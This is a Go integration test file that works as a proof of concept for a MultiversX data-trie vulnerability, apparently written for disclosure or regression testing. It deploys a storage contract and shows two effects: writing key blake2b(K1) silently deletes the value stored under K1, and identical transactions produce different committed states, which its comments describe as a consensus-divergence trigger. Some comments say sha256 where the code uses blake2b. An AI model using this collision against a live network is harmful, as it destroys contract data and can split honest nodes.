package dataTrieCollision

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math/big"
	"os"
	"testing"

	"github.com/multiversx/mx-chain-core-go/core"
	coreAPI "github.com/multiversx/mx-chain-core-go/data/api"
	"github.com/multiversx/mx-chain-core-go/hashing/blake2b"
	"github.com/multiversx/mx-chain-core-go/hashing/keccak"
	"github.com/stretchr/testify/require"

	testsChainSimulator "github.com/multiversx/mx-chain-go/integrationTests/chainSimulator"
	"github.com/multiversx/mx-chain-go/node/chainSimulator"
	"github.com/multiversx/mx-chain-go/node/chainSimulator/components/api"
	"github.com/multiversx/mx-chain-go/node/chainSimulator/dtos"
	"github.com/multiversx/mx-chain-go/process"
	"github.com/multiversx/mx-chain-go/process/factory"
)

const (
	pathToInitialConfig = "../../../cmd/node/config/"
	pathToWasm          = "testdata/store2.wasm"

	deployGasLimit = 100_000_000
	callGasLimit   = 50_000_000

	// AutoBalanceDataTriesEnableEpoch is 1 in the default config this simulator uses
	autoBalanceActivationEpoch = 1
)

var oneEGLD = big.NewInt(1000000000000000000)

// computeSCAddress replicates blockChainHookImpl.NewAddress for the wasm VM:
// keccak256(creator || littleEndian64(nonce)) with the 10-byte prefix mask (8 zeros + vmType)
// and the 2-byte shard suffix mask taken from the creator.
func computeSCAddress(creator []byte, nonce uint64) []byte {
	buffNonce := make([]byte, 8)
	binary.LittleEndian.PutUint64(buffNonce, nonce)
	adrAndNonce := append(creator, buffNonce...)
	base := keccak.NewKeccak().Compute(string(adrAndNonce))

	copy(base[:core.NumInitCharactersForScAddress-core.VMTypeLen], make([]byte, core.NumInitCharactersForScAddress-core.VMTypeLen))
	copy(base[core.NumInitCharactersForScAddress-core.VMTypeLen:core.NumInitCharactersForScAddress], factory.WasmVirtualMachine)
	copy(base[len(base)-core.ShardIdentiferLen:], creator[len(creator)-core.ShardIdentiferLen:])

	return base
}

func startSimulator(t *testing.T) testsChainSimulator.ChainSimulator {
	cs, err := chainSimulator.NewChainSimulator(chainSimulator.ArgsChainSimulator{
		BypassTxSignatureCheck:         true,
		TempDir:                        t.TempDir(),
		PathToInitialConfig:            pathToInitialConfig,
		NumOfShards:                    1,
		RoundDurationInMillis:          6000,
		SupernovaRoundDurationInMillis: 600,
		RoundsPerEpoch: core.OptionalUint64{
			HasValue: true,
			Value:    20,
		},
		SupernovaRoundsPerEpoch: core.OptionalUint64{
			HasValue: true,
			Value:    20,
		},
		ApiInterface:           api.NewNoApiInterface(),
		MinNodesPerShard:       3,
		MetaChainMinNodes:      3,
		NumNodesWaitingListMeta: 0,
	})
	require.Nil(t, err)
	require.NotNil(t, cs)

	// advance past the AutoBalanceDataTries activation epoch so all new writes are hashed-key writes
	err = cs.GenerateBlocksUntilEpochIsReached(int32(autoBalanceActivationEpoch))
	require.Nil(t, err)

	return cs
}

func deployStore2(t *testing.T, cs testsChainSimulator.ChainSimulator, wallet dtos.WalletAddress, nonce *uint64) []byte {
	code, err := os.ReadFile(pathToWasm)
	require.Nil(t, err)

	deployData := hex.EncodeToString(code) + "@" + hex.EncodeToString(factory.WasmVirtualMachine) + "@0102"
	tx := testsChainSimulator.GenerateTransaction(wallet.Bytes, *nonce, make([]byte, 32), big.NewInt(0), deployData, deployGasLimit)
	scAddress := computeSCAddress(wallet.Bytes, *nonce)
	*nonce++

	res, err := cs.SendTxAndGenerateBlockTilTxIsExecuted(tx, 7)
	require.Nil(t, err)
	require.NotNil(t, res)
	require.Equal(t, "success", res.Status.String())

	node := cs.GetNodeHandler(0)
	computedBech32, _ := node.GetCoreComponents().AddressPubKeyConverter().Encode(scAddress)
	t.Logf("deploy status=%s message=%q receiver=%s computed=%s", res.Status, res.ReturnMessage, res.Receiver, computedBech32)
	return scAddress
}

func callStore(t *testing.T, cs testsChainSimulator.ChainSimulator, wallet dtos.WalletAddress, nonce *uint64, scAddress []byte, function string, args ...[]byte) {
	data := function
	for _, arg := range args {
		data += "@" + hex.EncodeToString(arg)
	}

	tx := testsChainSimulator.GenerateTransaction(wallet.Bytes, *nonce, scAddress, big.NewInt(0), data, callGasLimit)
	*nonce++

	res, err := cs.SendTxAndGenerateBlockTilTxIsExecuted(tx, 7)
	require.Nil(t, err)
	require.NotNil(t, res)
	require.Equal(t, "success", res.Status.String())
}

func queryLoad(t *testing.T, cs testsChainSimulator.ChainSimulator, scAddress []byte, key []byte) []byte {
	node := cs.GetNodeHandler(0)
	res, _, err := node.GetFacadeHandler().ExecuteSCQuery(&process.SCQuery{
		ScAddress:   scAddress,
		FuncName:    "load1",
		Arguments:   [][]byte{key},
		CallerAddr:  nil,
		BlockNonce:  core.OptionalUint64{},
	})
	require.Nil(t, err)
	require.NotNil(t, res)
	require.Equal(t, "ok", res.ReturnCode)

	if len(res.ReturnData) == 0 {
		return nil
	}
	if len(res.ReturnData[0]) == 0 {
		return nil
	}
	return res.ReturnData[0]
}

func accountRootHash(t *testing.T, cs testsChainSimulator.ChainSimulator, scAddress []byte) string {
	// returns the hex-encoded data trie root hash of the account
	node := cs.GetNodeHandler(0)
	bech32, err := node.GetCoreComponents().AddressPubKeyConverter().Encode(scAddress)
	require.Nil(t, err)
	acc, _, err := node.GetFacadeHandler().GetAccount(bech32, coreAPI.AccountQueryOptions{})
	require.Nil(t, err)
	require.NotNil(t, acc)
	return hex.EncodeToString(acc.RootHash)
}

// TestChainSimulator_DataTrieKeyCollision_DeterministicKeyDestruction shows that a smart
// contract writing key K2 = sha256(K1) permanently deletes the already-committed value stored
// under K1: the raw-key fallback lookup in trackableDataTrie.retrieveValueFromTrie is version
// blind, so K2's write finds K1's hashed (AutoBalance) leaf at the physical position sha256(K1)=K2,
// mislabels it as a legacy NotSpecified leaf, and the migration path deletes it.
func TestChainSimulator_DataTrieKeyCollision_DeterministicKeyDestruction(t *testing.T) {
	if testing.Short() {
		t.Skip("this is not a short test")
	}

	cs := startSimulator(t)
	defer cs.Close()

	wallet, err := cs.GenerateAndMintWalletAddress(0, big.NewInt(0).Mul(oneEGLD, big.NewInt(100)))
	require.Nil(t, err)
	err = cs.GenerateBlocks(1)
	require.Nil(t, err)

	nonce := uint64(0)
	scAddress := deployStore2(t, cs, wallet, &nonce)

	k1 := []byte("deterministic-key-0001")
	v1 := []byte("value stored under K1")
	// the node's data-trie hasher is blake2b: K1's hashed (AutoBalance) leaf physically sits at key blake2b(K1)
	k2 := blake2b.NewBlake2b().Compute(string(k1))
	v2 := []byte("value stored under K2")

	// commit K1's value
	callStore(t, cs, wallet, &nonce, scAddress, "store1", k1, v1)
	require.Equal(t, v1, queryLoad(t, cs, scAddress, k1), "K1 value should be stored after tx1")
	rootAfterK1 := accountRootHash(t, cs, scAddress)
	t.Logf("root hash after storing K1: %s", rootAfterK1)

	// write K2 = blake2b(K1) in an independent transaction
	callStore(t, cs, wallet, &nonce, scAddress, "store1", k2, v2)

	gotK1 := queryLoad(t, cs, scAddress, k1)
	gotK2 := queryLoad(t, cs, scAddress, k2)
	rootAfterK2 := accountRootHash(t, cs, scAddress)

	t.Logf("K1 value after storing K2=blake2b(K1): %q", gotK1)
	t.Logf("K2 value after storing K2=blake2b(K1): %q", gotK2)
	t.Logf("root hash after storing K2:           %s", rootAfterK2)

	// THE BUG: K1's committed leaf has been silently destroyed by the K2 write
	require.Empty(t, gotK1, "vulnerability: writing K2=sha256(K1) deleted K1's stored value")
	require.Equal(t, v2, gotK2, "K2's own value should still be readable")
	require.NotEqual(t, rootAfterK1, rootAfterK2)
}

// TestChainSimulator_DataTrieKeyCollision_NondeterministicStateRoot shows that one transaction
// storing both K1 and K2=sha256(K1) (single execution, single account flush) commits different
// state roots depending on the Go map iteration order of trackableDataTrie.dirtyData: with N
// byte-identical transactions (same keys, same values, fresh contracts), the node commits more
// than one distinct final state. Two honest nodes executing the same block therefore compute
// different state roots and reject each other's blocks: an externally triggerable consensus
// divergence.
func TestChainSimulator_DataTrieKeyCollision_NondeterministicStateRoot(t *testing.T) {
	if testing.Short() {
		t.Skip("this is not a short test")
	}

	cs := startSimulator(t)
	defer cs.Close()

	wallet, err := cs.GenerateAndMintWalletAddress(0, big.NewInt(0).Mul(oneEGLD, big.NewInt(1000)))
	require.Nil(t, err)
	err = cs.GenerateBlocks(1)
	require.Nil(t, err)

	nonce := uint64(0)

	k1 := []byte("nondeterministic-key-01")
	v1 := []byte("v1")
	k2 := blake2b.NewBlake2b().Compute(string(k1))
	v2 := []byte("v2")

	const rounds = 60
	outcomes := make(map[string]int)

	for i := 0; i < rounds; i++ {
		scAddress := deployStore2(t, cs, wallet, &nonce)

		// one transaction writing both keys: the flush order of {K1, K2} decides the outcome
		callStore(t, cs, wallet, &nonce, scAddress, "store2", k1, v1, k2, v2)

		gotK1 := queryLoad(t, cs, scAddress, k1)
		root := accountRootHash(t, cs, scAddress)

		node := cs.GetNodeHandler(0)
		scBech32, _ := node.GetCoreComponents().AddressPubKeyConverter().Encode(scAddress)
		kvPairs, _, errKV := node.GetFacadeHandler().GetKeyValuePairs(scBech32, coreAPI.AccountQueryOptions{})
		if errKV == nil && i < 3 {
			keys := make([]string, 0, len(kvPairs))
			for k := range kvPairs {
				keys = append(keys, fmt.Sprintf("%x", k))
			}
			t.Logf("round %d: raw committed keys: %v", i, keys)
		}

		// the semantic outcome of the byte-identical transaction: is K1's value present or was it destroyed?
		outcome := fmt.Sprintf("K1read=%q", string(gotK1))
		if (i+1)%10 == 0 {
			t.Logf("round %d/%d: load1(K1)=%q load1(K2)=%q", i+1, rounds, string(gotK1), string(queryLoad(t, cs, scAddress, k2)))
		}
		if _, seen := outcomes[outcome]; !seen {
			t.Logf("first occurrence of outcome %q at round %d (contract root hash: %s)", outcome, i+1, root)
		}
		outcomes[outcome]++

		if (i+1)%10 == 0 {
			t.Logf("round %d/%d: distinct outcomes so far: %d", i+1, rounds, len(outcomes))
		}
	}

	t.Logf("=== distinct outcomes across %d byte-identical transactions (same keys, same values, fresh contracts) ===", rounds)
	for outcome, count := range outcomes {
		t.Logf("%4d x  %s", count, outcome)
	}

	require.Greater(t, len(outcomes), 1,
		"vulnerability: identical transactions must always produce the identical semantic state; "+
			"found %d distinct outcomes - the committed state depends on Go map iteration order, so honest nodes "+
			"computing the same block derive different state roots (consensus divergence)", len(outcomes))
}
